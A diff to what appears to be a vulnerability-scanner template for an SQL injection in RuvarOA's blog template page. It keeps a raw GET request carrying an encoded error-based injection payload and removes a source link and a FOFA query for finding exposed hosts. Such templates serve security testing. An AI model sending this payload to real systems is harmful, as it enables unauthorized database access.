@@ -3,14 +3,8 @@ info:
   name: RuvarOAsys_blogtemplate_new存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/346d029baac7515b2b9ea87e0867a2d7
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 346d029baac7515b2b9ea87e0867a2d7
-    fofa: + fofa`body="txt_admin_key"`
 http:
 - raw:
   - 'GET /SysManage/sys_blogtemplate_new.aspx?id=1+AND+4582+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%284582%3D4582%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29 HTTP/1.1
